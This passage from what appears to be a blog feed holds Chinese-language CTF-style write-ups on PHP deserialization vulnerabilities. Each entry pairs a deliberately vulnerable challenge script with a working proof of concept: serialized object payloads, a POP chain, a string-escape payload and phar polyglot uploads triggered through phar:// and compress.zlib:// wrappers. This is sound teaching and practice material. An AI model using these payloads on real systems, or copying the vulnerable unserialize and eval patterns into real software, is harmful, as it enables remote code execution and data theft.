class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;her = &amp;<span class="variable">$b</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint.php?Sonder=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint.php传参后重新访问index.php，得到flag。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln13-引用和session&quot;&gt;&lt;a href=&quot;#serVuln13-引用和session&quot; class=&quot;headerlink&quot; title=&quot;serVuln13 引用和session&quot;&gt;&lt;/a&gt;serVuln13 引用和session&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln12 a phar trick</title>
    <link href="http://example.com/2023/12/22/serVuln12/"/>
    <id>http://example.com/2023/12/22/serVuln12/</id>
    <published>2023-12-22T13:32:23.000Z</published>
    <updated>2023-12-23T04:42:30.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln12-a-phar-trick"><a href="#serVuln12-a-phar-trick" class="headerlink" title="serVuln12 a phar trick"></a>serVuln12 a phar trick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">保证phar.readonly=Off，运行POC.php，生成phar1.phar，更改后缀名为.png，进入upload.php上传，返回路径upload/phar.php，访问index.php，发送POST请求，由于过滤参数中的phar字符，参数Sonder=compress.zlib://phar://upload/phar1.png</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln12-a-phar-trick&quot;&gt;&lt;a href=&quot;#serVuln12-a-phar-trick&quot; class=&quot;headerlink&quot; title=&quot;serVuln12 a phar trick&quot;&gt;&lt;/a&gt;serVuln12 a phar tri</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln11 a phar</title>
    <link href="http://example.com/2023/12/22/serVuln11/"/>
    <id>http://example.com/2023/12/22/serVuln11/</id>
    <published>2023-12-22T13:31:23.000Z</published>
    <updated>2023-12-23T04:42:29.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln11-a-phar"><a href="#serVuln11-a-phar" class="headerlink" title="serVuln11 a phar"></a>serVuln11 a phar</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><pre><code class="漏洞利用">保证phar.readonly=Off，运行POC.php，生成phar1.phar，更改后缀名为.png，进入upload.php上传，返回路径upload/phar.php，访问index.php，发送POST请求，参数Sonder=phar://upload/phar1.png</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln11-a-phar&quot;&gt;&lt;a href=&quot;#serVuln11-a-phar&quot; class=&quot;headerlink&quot; title=&quot;serVuln11 a phar&quot;&gt;&lt;/a&gt;serVuln11 a phar&lt;/h1&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln9 ezpop</title>
    <link href="http://example.com/2023/12/22/serVuln9/"/>
    <id>http://example.com/2023/12/22/serVuln9/</id>
    <published>2023-12-22T13:29:23.000Z</published>
    <updated>2023-12-23T04:42:30.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln9-ezpop"><a href="#serVuln9-ezpop" class="headerlink" title="serVuln9 ezpop"></a>serVuln9 ezpop</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$modifier</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;source-&gt;str = <span class="variable">$test</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;p = <span class="variable">$modifier</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln9-ezpop&quot;&gt;&lt;a href=&quot;#serVuln9-ezpop&quot; class=&quot;headerlink&quot; title=&quot;serVuln9 ezpop&quot;&gt;&lt;/a&gt;serVuln9 ezpop&lt;/h1&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln8 反序列化字符增加逃逸</title>
    <link href="http://example.com/2023/12/22/serVuln8/"/>
    <id>http://example.com/2023/12/22/serVuln8/</id>
    <published>2023-12-22T13:28:23.000Z</published>
    <updated>2023-12-23T04:42:30.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln8-反序列化字符增加逃逸"><a href="#serVuln8-反序列化字符增加逃逸" class="headerlink" title="serVuln8 反序列化字符增加逃逸"></a>serVuln8 反序列化字符增加逃逸</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass == <span class="string">&#x27;escaping&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo serialize(new test(&#x27;1&#x27;));</span></span><br><span class="line"><span class="comment">// 测试 O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:1:&quot;1&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要逃逸内容：&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125; 29个字符</span></span><br><span class="line"><span class="variable">$repeat</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;php&quot;</span>,<span class="number">29</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$repeat</span>.<span class="string">&#x27;&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$param</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本地测试payload</span></span><br><span class="line"><span class="comment">//$profile = unserialize(filter($param));</span></span><br><span class="line"><span class="comment">//if($profile-&gt;pass == &#x27;escaping&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;🎉️congratulation&quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln8-反序列化字符增加逃逸&quot;&gt;&lt;a href=&quot;#serVuln8-反序列化字符增加逃逸&quot; class=&quot;headerlink&quot; title=&quot;serVuln8 反序列化字符增加逃逸&quot;&gt;&lt;/a&gt;serVuln8 反序列化字符增加逃逸&lt;/h1&gt;&lt;figu</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln7 __call与属性的初始值</title>
    <link href="http://example.com/2023/12/22/serVuln7/"/>
    <id>http://example.com/2023/12/22/serVuln7/</id>
    <published>2023-12-22T13:27:23.000Z</published>
    <updated>2023-12-23T04:42:30.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln7-call与属性的初始值"><a href="#serVuln7-call与属性的初始值" class="headerlink" title="serVuln7 __call与属性的初始值"></a>serVuln7 __call与属性的初始值</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$project</span> = <span class="variable language_">$this</span>-&gt;pro;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body-&gt;<span class="variable">$project</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> == <span class="string">&#x27;yourname&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;myname&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">you</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$body</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pro</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;body=<span class="keyword">new</span> <span class="title function_ invoke__">my</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pro=<span class="string">&#x27;yourname&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;myname&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">you</span>());</span><br><span class="line"><span class="comment">//O:3:&quot;you&quot;:2:&#123;s:9:&quot; you body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot; you pro&quot;;s:8:&quot;yourname&quot;;&#125;</span></span><br><span class="line"><span class="comment">//大写S</span></span><br><span class="line"><span class="comment">//O:3:&quot;you&quot;:2:&#123;S:9:&quot;\00you\00body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;S:8:&quot;\00you\00pro&quot;;s:8:&quot;yourname&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:3:&quot;you&quot;:2:&#123;S:9:&quot;\00you\00body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;S:8:&quot;\00you\00pro&quot;;s:8:&quot;yourname&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln7-call与属性的初始值&quot;&gt;&lt;a href=&quot;#serVuln7-call与属性的初始值&quot; class=&quot;headerlink&quot; title=&quot;serVuln7 __call与属性的初始值&quot;&gt;&lt;/a&gt;serVuln7 __call与属性的初始值&lt;/</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln6 私有属性反序列化</title>
    <link href="http://example.com/2023/12/22/serVuln6/"/>
    <id>http://example.com/2023/12/22/serVuln6/</id>
    <published>2023-12-22T13:26:23.000Z</published>
    <updated>2023-12-23T04:42:30.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln6-私有属性反序列化"><a href="#serVuln6-私有属性反序列化" class="headerlink" title="serVuln6 私有属性反序列化"></a>serVuln6 私有属性反序列化</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;daydream&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span 